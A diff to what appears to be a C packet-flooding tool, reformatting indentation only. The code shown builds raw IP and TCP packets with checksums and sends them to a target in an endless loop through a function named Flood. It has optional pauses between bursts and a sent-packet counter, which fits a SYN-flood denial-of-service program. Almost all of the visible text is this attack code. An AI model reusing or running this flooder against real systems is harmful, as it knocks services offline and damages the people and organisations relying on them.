@@ -137,7 +137,7 @@ void Init( char *buffer )
     memcpy( (void*)(buffer + sizeof(PsdHeader)), (void*)&TcpHeader, sizeof(TcpHeader) );
     TcpHeader.th_sum = CheckSum( (unsigned short *) buffer, sizeof(PsdHeader) + sizeof(TcpHeader) );
 
-	memset( buffer, 0, PACKET_SIZE );
+    memset( buffer, 0, PACKET_SIZE );
     memcpy( (void*)buffer, (void*)&IpHeader, sizeof(IpHeader) );
     IpHeader.checksum = CheckSum( (unsigned short *) buffer, sizeof(IpHeader) );
 
@@ -148,8 +148,8 @@ void Init( char *buffer )
 void Flood( )
 {
     int     sock;
-	int     flag = 1;
-	char    buffer[PACKET_SIZE] = { 0 };
+    int     flag = 1;
+    char    buffer[PACKET_SIZE] = { 0 };
  
     struct  sockaddr_in     sa;
     memset( &sa, 0, sizeof(struct  sockaddr_in) );
@@ -169,35 +169,33 @@ void Flood( )
         exit (-1);
     }
  
-	srand((unsigned) time(NULL));
+    srand((unsigned) time(NULL));
  
-	int     number = 0;
-	if( sleeptime == 0 )
-	{
-		while(1)
-		{
-			memset( (void*)buffer, 0, PACKET_SIZE );
-        	Init( buffer );
- 
-        	sendto( sock, buffer, PACKET_SIZE, 0, (struct sockaddr *)(&sa), sizeof(struct sockaddr_in) );
-        	outcount ++;
-		}
-	}
-	else
-	{
-		while(1)
-		{
-			memset( (void*)buffer, 0, PACKET_SIZE );
-        	Init( buffer );
+    int number = 0;
+    if( sleeptime == 0 )
+    {
+        while(1)
+        {
+            memset( (void*)buffer, 0, PACKET_SIZE );
+            Init( buffer );
+            
+            sendto( sock, buffer, PACKET_SIZE, 0, (struct sockaddr *)(&sa), sizeof(struct sockaddr_in) );
+            outcount ++;
+        }
+    } else {
+        while(1) 
+        {
+            memset( (void*)buffer, 0, PACKET_SIZE );
+            Init( buffer );
  
         	sendto( sock, buffer, PACKET_SIZE, 0, (struct sockaddr *)(&sa), sizeof(struct sockaddr_in) );
         	outcount ++;
 			number ++;
  
-			if( number == pkt_then_sleep )
+            if( number == pkt_then_sleep )
             {
-				MySleep( sleeptime );
-				number = 0;
+                MySleep( sleeptime );
+                number = 0;
             }
         }
     }
@@ -205,7 +203,7 @@ void Flood( )
  
 void sig_proc(int signum)
 {
-	int ctime = 0;
+    int ctime = 0;
  
     printf( "signal: %d\n", signum );
 
@@ -222,10 +220,10 @@ void sig_proc(int signum)
  
 int main(int argc,char *argv[])
 {
-	int ret = 0;
-	pthread_t* my_thread = NULL;
-	int a =0;
-	int type = 0;
+    int ret = 0;
+    pthread_t* my_thread = NULL;
+    int a =0;
+    int type = 0;
  
     if( argc != 5 )
     {
